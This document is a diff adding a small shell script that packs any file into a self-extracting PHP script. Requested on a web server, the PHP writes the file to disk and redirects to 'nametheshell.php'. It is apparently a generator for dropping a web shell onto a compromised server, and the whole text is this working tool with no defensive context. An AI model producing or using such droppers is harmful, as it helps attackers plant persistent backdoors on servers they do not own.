@@ -1,0 +1,28 @@
+#!/bin/sh
+# Pack a file into a php script.
+#
+# Steps followed by it:
+# 	* compress INPUT
+#	* encode compressed stream with base64
+#	* put it into a php that uncompresses it 
+#	  and save into a file with same name
+#	  at INPUT.
+#
+
+if [ -z $1 ] || [ -z $2 ]; then
+	echo "Usage: $0 INPUT OUTPUT"
+	exit 1
+else
+	filename=$1
+	output=$2
+fi
+
+tmpfilename="/tmp/`basename $0`.$$"
+
+gzip -c < $filename | base64 -w 0 > $tmpfilename
+
+echo "<?php file_put_contents(\"$filename\", gzdecode(base64_decode(\"`cat $tmpfilename`\")));
+header(\"Location: nametheshell.php\");
+ ?>" > $output;
+
+rm $tmpfilename
